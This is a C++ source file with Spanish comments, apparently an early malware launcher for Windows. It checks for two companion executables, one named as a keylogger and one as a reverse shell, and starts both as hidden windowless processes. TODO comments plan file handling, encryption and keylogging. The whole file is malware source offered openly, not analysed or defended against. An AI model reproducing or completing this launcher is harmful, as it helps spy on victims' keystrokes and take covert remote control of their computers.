#include <iostream>
#include <fstream>
#include <string>
#include "errors.hpp"
#pragma comment(lib, "Ws2_32.lib")

//Arreglar error de q libarbys se mantiene incluso cuando ya termino la conexion
#define key_logger_name "libarbys.exe"
#define reverse_shell_name "libval.exe"
int main()
{
    std::ifstream key_logger_file(key_logger_name);
    if (!key_logger_file.good())
    {
        std::string path;
        path = "falta el archivo ";
        path += key_logger_name;
        sys_error(path.c_str(), "Dependency Error");
    }
    std::ifstream reverse_shell_file(reverse_shell_name);
    if (!reverse_shell_file.good())
    {
        std::string path;
        path = "falta el archivo ";
        path += reverse_shell_name;
        sys_error(path.c_str(), "Dependency Error");
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    PROCESS_INFORMATION pi2;
    if (!CreateProcess(NULL, (LPSTR) reverse_shell_name, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
    || !CreateProcess(NULL, (LPSTR) key_logger_name, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi2))
    {
        error("no se pudo crear los procesos de dependencias", GetLastError());
    }
    

    // TODO: Archivos
    // TODO: Prioridad
    // TODO: Encriptacion
    // TODO: Keylogger
}